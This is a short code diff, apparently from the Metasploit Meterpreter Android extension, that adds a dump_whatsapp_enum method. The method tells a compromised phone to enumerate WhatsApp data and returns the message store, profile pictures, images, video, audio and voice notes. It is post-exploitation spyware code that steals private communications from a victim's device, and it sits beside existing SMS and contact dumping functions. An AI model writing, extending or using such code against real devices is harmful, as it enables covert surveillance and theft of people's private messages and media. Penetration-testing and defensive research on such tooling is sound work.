@@ -196,6 +196,24 @@ class Android < Extension
     end
     sms
   end
+  
+  def dump_whatsapp_enum
+    store = Hash.new
+    request = Packet.create_request('dump_whatsapp')
+    request.add_tlv(TLV_TYPE_WHATSAPP_REQUEST, 'enumerate_all')
+    response = client.send_request(request)
+    
+    store =
+      {
+        'msgstore' => client.unicode_filter_encode(response.get_tlv_value(TLV_TYPE_WHATSAPP_ENUM_MSG).to_s),
+        'profile' => client.unicode_filter_encode(response.get_tlv_value(TLV_TYPE_WHATSAPP_ENUM_PP).to_s),
+        'image' => client.unicode_filter_encode(response.get_tlv_value(TLV_TYPE_WHATSAPP_ENUM_IMG).to_s),
+        'video' => client.unicode_filter_encode(response.get_tlv_value(TLV_TYPE_WHATSAPP_ENUM_VID).to_s),
+        'audio' => client.unicode_filter_encode(response.get_tlv_value(TLV_TYPE_WHATSAPP_ENUM_AUD).to_s),
+        'voice' => client.unicode_filter_encode(response.get_tlv_value(TLV_TYPE_WHATSAPP_ENUM_VOI).to_s)
+      }
+    return store
+  end
 
   def dump_contacts
     contacts = []
